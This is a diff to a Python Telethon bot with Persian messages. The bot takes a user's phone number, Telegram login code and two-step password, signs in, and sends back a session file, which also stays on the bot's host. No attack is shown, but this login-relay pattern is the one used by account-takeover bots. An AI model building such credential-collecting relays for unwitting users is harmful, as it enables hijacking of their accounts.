@@ -64,18 +64,29 @@ class SessionBot:
         )
         self.temp_clients = {}
 
-    def clean_code(self, raw_code):
+    def validate_code_format(self, code):
         """
-        پاکسازی کد ورودی:
-        - حذف فاصله‌ها
-        - حذف نقطه‌ها
-        - فقط نگه داشتن اعداد
+        بررسی فرمت کد:
+        - فقط باید شامل اعداد باشد
+        - بدون فاصله، نقطه یا هر کاراکتر دیگر
         """
-        # حذف فاصله‌ها و نقطه‌ها
-        cleaned = raw_code.replace(" ", "").replace(".", "")
-        # فقط اعداد را نگه دار
-        cleaned = re.sub(r'[^0-9]', '', cleaned)
-        return cleaned
+        # اگر خالی باشد
+        if not code:
+            return False, "کد نمی‌تواند خالی باشد."
+        
+        # اگر شامل فاصله باشد
+        if ' ' in code:
+            return False, "❌ فرمت کد صحیح نیست. لطفاً کد را بدون فاصله ارسال کنید."
+        
+        # اگر شامل نقطه باشد
+        if '.' in code:
+            return False, "❌ فرمت کد صحیح نیست. لطفاً کد را بدون نقطه ارسال کنید."
+        
+        # اگر شامل کاراکتر غیرعددی باشد
+        if not code.isdigit():
+            return False, "❌ فرمت کد صحیح نیست. لطفاً فقط از اعداد استفاده کنید."
+        
+        return True, code
 
     async def start(self):
         await self.bot.start(bot_token=BOT_TOKEN)
@@ -104,23 +115,16 @@ class SessionBot:
                 'client': client,
                 'session_path': session_path,
                 'session_name': session_name,
-                'step': 'phone',
-                'code': '',
+                'step': 'phone',  # phone, code, 2fa
                 'phone': None,
-                'code_length': 5,
-                'message_id': None,
                 'phone_code_hash': None,
-                'waiting_for_code': False  # برای تشخیص اینکه کاربر در مرحله دریافت کد است
+                'code': '',  # کد پاکسازی شده
             }
             
             await event.respond(
                 "👋 به ربات ساخت سشن خوش آمدید!\n\n"
                 "📱 لطفاً شماره تلفن خود را با کد کشور وارد کنید.\n"
-                "مثال: +989123456789\n\n"
-                "⚠️ فرمت‌های مجاز برای کد:\n"
-                "• `0 0 0 0 0`\n"
-                "• `0.0.0.0.0`\n"
-                "• `00000`"
+                "مثال: +989123456789"
             )
 
         @self.bot.on(events.NewMessage)
@@ -138,210 +142,88 @@ class SessionBot:
                 
                 try:
                     if step == 'phone':
+                        # دریافت شماره تلفن
                         phone = event.text.strip()
                         
+                        # اتصال به کلاینت
                         await client.connect()
                         
                         if not await client.is_user_authorized():
                             try:
+                                # ارسال درخواست کد
                                 send_result = await client.send_code_request(phone)
                                 user_data['phone'] = phone
                                 user_data['step'] = 'code'
-                                user_data['code'] = ''
                                 user_data['phone_code_hash'] = send_result.phone_code_hash
-                                user_data['waiting_for_code'] = True
                                 
-                                # نمایش پنل کد
-                                await self.show_code_panel(event, user_data)
+                                await event.respond(
+                                    "✅ کد تأیید به شماره شما ارسال شد.\n\n"
+                                    "📝 لطفاً کد احراز هویت را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
+                                    "مثال صحیح: `12345`\n\n"
+                                    "⚠️ فرمت‌های زیر **غیرمجاز** هستند:\n"
+                                    "• `1 2 3 4 5` (با فاصله)\n"
+                                    "• `1.2.3.4.5` (با نقطه)"
+                                )
                                 
                             except Exception as e:
-                                await event.respond(f"❌ خطا: {str(e)}")
+                                await event.respond(f"❌ خطا در ارسال کد: {str(e)}")
                         else:
                             await event.respond("⚠️ این شماره قبلاً تأیید شده است!")
                     
-                    elif step == 'code' or step == '2fa':
-                        # اگر کاربر کد را به صورت پیام متنی ارسال کرده
-                        if user_data.get('waiting_for_code', False):
-                            raw_code = event.text.strip()
-                            
-                            # پاکسازی کد
-                            cleaned_code = self.clean_code(raw_code)
-                            
-                            # بررسی اینکه کد پاکسازی شده فقط شامل اعداد باشد
-                            if cleaned_code and cleaned_code.isdigit():
-                                # به‌روزرسانی کد در user_data
-                                user_data['code'] = cleaned_code
-                                
-                                # اگر کد کامل است، آن را تأیید کن
-                                code_length = user_data.get('code_length', 5)
-                                if len(cleaned_code) == code_length:
-                                    # کد را مستقیماً تأیید کن
-                                    if step == '2fa':
-                                        await self.verify_2fa(event, user_data)
-                                    else:
-                                        await self.verify_code(event, user_data)
-                                else:
-                                    # کد کامل نیست، پیام خطا بده
-                                    await event.respond(
-                                        f"⚠️ کد باید {code_length} رقم باشد.\n"
-                                        f"کد وارد شده: `{cleaned_code}` ({len(cleaned_code)} رقم)\n\n"
-                                        "لطفاً دوباره تلاش کنید:\n"
-                                        "• `0 0 0 0 0`\n"
-                                        "• `0.0.0.0.0`\n"
-                                        "• `00000`"
-                                    )
-                            else:
-                                # کد نامعتبر
-                                await event.respond(
-                                    "⚠️ فرمت کد نامعتبر است!\n\n"
-                                    "فرمت‌های مجاز:\n"
-                                    "• `0 0 0 0 0`\n"
-                                    "• `0.0.0.0.0`\n"
-                                    "• `00000`\n\n"
-                                    "لطفاً دوباره تلاش کنید."
-                                )
-                        else:
-                            # کاربر در مرحله کد نیست اما پیام داده
+                    elif step == 'code':
+                        # دریافت کد احراز هویت
+                        raw_code = event.text.strip()
+                        
+                        # بررسی فرمت کد
+                        is_valid, message = self.validate_code_format(raw_code)
+                        
+                        if not is_valid:
+                            # نمایش خطا و راهنمایی مجدد
                             await event.respond(
-                                "⚠️ لطفاً از دکمه‌های زیر استفاده کنید یا کد را با فرمت صحیح ارسال کنید.\n\n"
-                                "فرمت‌های مجاز:\n"
-                                "• `0 0 0 0 0`\n"
-                                "• `0.0.0.0.0`\n"
-                                "• `00000`"
+                                f"{message}\n\n"
+                                "📝 لطفاً کد را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
+                                "مثال صحیح: `12345`"
                             )
+                            return
+                        
+                        # کد معتبر است
+                        user_data['code'] = raw_code  # ذخیره به صورت string
+                        
+                        # تأیید کد
+                        await self.verify_code(event, user_data)
+                    
+                    elif step == '2fa':
+                        # دریافت رمز 2FA
+                        raw_password = event.text.strip()
+                        
+                        # بررسی فرمت رمز (می‌تواند شامل حروف و اعداد باشد)
+                        if not raw_password:
+                            await event.respond(
+                                "❌ رمز عبور نمی‌تواند خالی باشد.\n"
+                                "لطفاً رمز عبور دو مرحله‌ای خود را وارد کنید:"
+                            )
+                            return
+                        
+                        user_data['code'] = raw_password
+                        
+                        # تأیید رمز 2FA
+                        await self.verify_2fa(event, user_data)
                 
                 except Exception as e:
-                    await event.respond(f"❌ خطای غیرمنتظره: {str(e)}")
-
-        @self.bot.on(events.CallbackQuery)
-        async def handle_callback(event):
-            user_id = event.sender_id
-            
-            if user_id not in self.temp_clients:
-                await event.answer("❗ لطفاً ابتدا /start را بزنید.", alert=True)
-                return
-            
-            user_data = self.temp_clients[user_id]
-            data = event.data.decode()
-            
-            if user_data['step'] == 'code' or user_data['step'] == '2fa':
-                await self.handle_code_input(event, user_data, data)
+                    error_msg = str(e)
+                    # بررسی خطاهای خاص
+                    if "FLOOD" in error_msg:
+                        await event.respond("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.")
+                    else:
+                        await event.respond(f"❌ خطای غیرمنتظره: {error_msg}")
 
         await self.bot.run_until_disconnected()
 
-    async def show_code_panel(self, event, user_data):
-        """نمایش پنل شیشه‌ای وارد کردن کد"""
-        step = user_data['step']
-        code = user_data['code']
-        
-        if step == '2fa':
-            title = "🔐 رمز عبور دو مرحله‌ای را وارد کنید:"
-            placeholder = "••••••••"
-            display_code = "•" * len(code) if code else placeholder
-        else:
-            code_length = user_data.get('code_length', 5)
-            title = "📝 کد تأیید را وارد کنید:"
-            placeholder = "_" * code_length
-            
-            if code:
-                display_code = code + "_" * (code_length - len(code))
-            else:
-                display_code = placeholder
-        
-        # ساخت دکمه‌ها
-        buttons = []
-        row = []
-        for i in range(1, 10):
-            row.append((str(i), f"code_{i}"))
-            if i % 3 == 0:
-                buttons.append(row)
-                row = []
-        
-        buttons.append([
-            ("🗑️ پاک کردن", "code_clear"),
-            ("0", "code_0"),
-            ("✅ تأیید", "code_submit")
-        ])
-        
-        keyboard = []
-        for row in buttons:
-            keyboard.append([{
-                'text': text,
-                'callback_data': callback_data
-            } for text, callback_data in row])
-        
-        # اضافه کردن راهنمای ارسال مستقیم
-        message_text = (
-            f"{title}\n\n"
-            f"`{display_code}`\n\n"
-            "📱 **یا می‌توانید کد را مستقیماً ارسال کنید:**\n"
-            "• `0 0 0 0 0`\n"
-            "• `0.0.0.0.0`\n"
-            "• `00000`\n\n"
-            "از دکمه‌های زیر یا پیام متنی استفاده کنید:"
-        )
-        
-        if user_data.get('message_id'):
-            try:
-                await self.bot.edit_message(
-                    event.chat_id,
-                    user_data['message_id'],
-                    message_text,
-                    parse_mode='markdown',
-                    buttons=keyboard
-                )
-            except:
-                msg = await event.respond(message_text, parse_mode='markdown', buttons=keyboard)
-                user_data['message_id'] = msg.id
-        else:
-            msg = await event.respond(message_text, parse_mode='markdown', buttons=keyboard)
-            user_data['message_id'] = msg.id
-        
-        await event.answer()
-
-    async def handle_code_input(self, event, user_data, data):
-        """پردازش ورودی‌های پنل کد"""
-        code = user_data['code']
-        step = user_data['step']
-        
-        if data.startswith('code_'):
-            action = data.split('_')[1]
-            
-            if action == 'clear':
-                if code:
-                    user_data['code'] = code[:-1]
-                await self.show_code_panel(event, user_data)
-                await event.answer()
-                
-            elif action == 'submit':
-                if step == '2fa':
-                    if len(code) < 1:
-                        await event.answer("❗ لطفاً رمز عبور را وارد کنید.", alert=True)
-                        return
-                    await self.verify_2fa(event, user_data)
-                else:
-                    code_length = user_data.get('code_length', 5)
-                    if len(code) != code_length:
-                        await event.answer(f"❗ لطفاً کد {code_length} رقمی را کامل وارد کنید.", alert=True)
-                        return
-                    await self.verify_code(event, user_data)
-                
-            elif action.isdigit():
-                if step == '2fa':
-                    user_data['code'] = code + action
-                else:
-                    code_length = user_data.get('code_length', 5)
-                    if len(code) < code_length:
-                        user_data['code'] = code + action
-                    else:
-                        await event.answer(f"❗ کد {code_length} رقمی کامل شد.", alert=True)
-                        return
-                await self.show_code_panel(event, user_data)
-                await event.answer()
-
     async def verify_code(self, event, user_data):
-        """تأیید کد ورود با استفاده از روش صحیح Telethon"""
-        code = user_data['code']
+        """
+        تأیید کد ورود با استفاده از روش صحیح Telethon
+        """
+        code = user_data['code']  # string
         phone = user_data['phone']
         client = user_data['client']
         phone_code_hash = user_data.get('phone_code_hash')
@@ -354,86 +236,86 @@ class SessionBot:
                 await client.sign_in(phone, code)
             
             # موفقیت
-            await event.answer("✅ تأیید کد با موفقیت انجام شد!", alert=True)
-            
-            # ارسال فایل سشن
-            session_file = user_data['session_path'] + ".session"
-            
-            if os.path.isfile(session_file):
-                # ارسال به Saved Messages
-                await client.send_file(
-                    "me",
-                    session_file,
-                    caption=f"📁 فایل سشن: {user_data['session_name']}"
-                )
-                
-                # ارسال به ربات
-                await self.bot.send_file(
-                    event.chat_id,
-                    session_file,
-                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
-                )
-                
-                # حذف پنل
-                if user_data.get('message_id'):
-                    try:
-                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
-                    except:
-                        pass
-                
-                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
-                
-                # پاک کردن داده‌های موقت
-                del self.temp_clients[event.sender_id]
-            else:
-                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
+            await self.handle_successful_login(event, user_data)
                 
         except SessionPasswordNeededError:
             # نیاز به رمز 2FA
             user_data['step'] = '2fa'
-            user_data['code'] = ''
-            user_data['waiting_for_code'] = True
-            await event.answer("🔐 نیاز به رمز عبور دو مرحله‌ای!", alert=True)
-            await self.show_code_panel(event, user_data)
+            await event.respond(
+                "🔐 این حساب دارای رمز عبور دو مرحله‌ای است.\n\n"
+                "لطفاً رمز عبور خود را وارد کنید:"
+            )
             
         except PhoneCodeInvalidError:
             # کد اشتباه
             user_data['code'] = ''
-            await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
-            await self.show_code_panel(event, user_data)
+            await event.respond(
+                "❌ کد وارد شده اشتباه است!\n\n"
+                "📝 لطفاً کد را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
+                "مثال صحیح: `12345`"
+            )
             
         except PhoneCodeExpiredError:
             # کد منقضی شده
-            await event.answer("❌ کد منقضی شده است. دوباره /start را بزنید.", alert=True)
+            await event.respond(
+                "❌ کد منقضی شده است.\n\n"
+                "لطفاً دوباره /start را بزنید و شماره خود را مجدداً وارد کنید."
+            )
             del self.temp_clients[event.sender_id]
             
         except Exception as e:
             error_msg = str(e)
             # بررسی خطاهای خاص
-            if "FLOOD" in error_msg:
-                await event.answer("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.", alert=True)
-            elif "PHONE_CODE_INVALID" in error_msg:
+            if "PHONE_CODE_INVALID" in error_msg:
                 user_data['code'] = ''
-                await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
-                await self.show_code_panel(event, user_data)
+                await event.respond(
+                    "❌ کد وارد شده اشتباه است!\n\n"
+                    "📝 لطفاً کد را **بدون فاصله** و **بدون نقطه** ارسال کنید.\n"
+                    "مثال صحیح: `12345`"
+                )
+            elif "FLOOD" in error_msg:
+                await event.respond("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.")
             else:
-                await event.answer(f"❌ خطا: {error_msg}", alert=True)
+                await event.respond(f"❌ خطا: {error_msg}")
 
     async def verify_2fa(self, event, user_data):
-        """تأیید رمز 2FA با استفاده از روش صحیح Telethon"""
+        """
+        تأیید رمز 2FA با استفاده از روش صحیح Telethon
+        """
         password = user_data['code']
         client = user_data['client']
         
         try:
+            # روش صحیح تأیید رمز 2FA در Telethon
             await client.sign_in(password=password)
             
             # موفقیت
-            await event.answer("✅ تأیید رمز با موفقیت انجام شد!", alert=True)
+            await self.handle_successful_login(event, user_data)
+                
+        except Exception as e:
+            error_msg = str(e)
+            if "PASSWORD_HASH_INVALID" in error_msg or "SRP_ID_INVALID" in error_msg:
+                user_data['code'] = ''
+                await event.respond(
+                    "❌ رمز عبور اشتباه است!\n\n"
+                    "لطفاً رمز عبور دو مرحله‌ای خود را مجدداً وارد کنید:"
+                )
+            else:
+                await event.respond(f"❌ خطا: {error_msg}")
+
+    async def handle_successful_login(self, event, user_data):
+        """
+        مدیریت ورود موفق: ارسال فایل سشن و پاکسازی داده‌ها
+        """
+        await event.respond("✅ تأیید با موفقیت انجام شد!")
+        
+        # ارسال فایل سشن
+        session_file = user_data['session_path'] + ".session"
+        
+        if os.path.isfile(session_file):
+            client = user_data['client']
             
-            # ارسال فایل سشن
-            session_file = user_data['session_path'] + ".session"
-            
-            if os.path.isfile(session_file):
+            try:
                 # ارسال به Saved Messages
                 await client.send_file(
                     "me",
@@ -448,28 +330,19 @@ class SessionBot:
                     caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                 )
                 
-                # حذف پنل
-                if user_data.get('message_id'):
-                    try:
-                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
-                    except:
-                        pass
+                await event.respond(
+                    "✅ عملیات با موفقیت انجام شد!\n\n"
+                    "📁 فایل سشن به Saved Messages و اینجا ارسال شد."
+                )
                 
-                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
-                
-                # پاک کردن داده‌های موقت
-                del self.temp_clients[event.sender_id]
-            else:
-                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
-                
-        except Exception as e:
-            error_msg = str(e)
-            if "PASSWORD_HASH_INVALID" in error_msg or "SRP_ID_INVALID" in error_msg:
-                user_data['code'] = ''
-                await event.answer("❌ رمز عبور اشتباه است! دوباره تلاش کنید.", alert=True)
-                await self.show_code_panel(event, user_data)
-            else:
-                await event.answer(f"❌ خطا: {error_msg}", alert=True)
+            except Exception as e:
+                await event.respond(f"❌ خطا در ارسال فایل: {str(e)}")
+        else:
+            await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
+        
+        # پاک کردن داده‌های موقت
+        if event.sender_id in self.temp_clients:
+            del self.temp_clients[event.sender_id]
 
 # ==================== اجرای اصلی ====================
 async def main():
